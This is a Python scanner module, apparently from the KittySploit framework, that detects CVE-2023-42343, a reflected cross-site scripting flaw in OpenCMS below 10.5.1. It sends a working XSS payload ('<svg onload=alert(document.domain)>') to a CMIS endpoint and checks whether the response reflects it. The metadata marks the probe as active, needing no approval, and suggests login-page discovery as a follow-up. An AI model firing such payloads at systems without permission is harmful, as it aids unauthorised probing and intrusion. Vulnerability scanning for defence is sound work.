#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OpenCMS below 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenCMS - Cross-Site Scripting Detection',
        'description': 'OpenCMS below 10.5.1 is vulnerable to Cross-Site Scripting vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'opencms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://labs.watchtowr.com/xxe-you-can-depend-on-me-opencms/'],
        'cve': 'CVE-2023-42343',
    }

    def run(self):
        r = self.http_request(method="GET", path='/opencms/cmisatom/cmis-online/type?id=1%27"><svg%20onload=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Apache Chemistry OpenCMIS', '<svg onload=alert(document.domain)>',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="OpenCMS - Cross-Site Scripting detected",
                path='/opencms/cmisatom/cmis-online/type?id=1%27"><svg%20onload=alert(document.domain)>',
            )
            return True
        return False

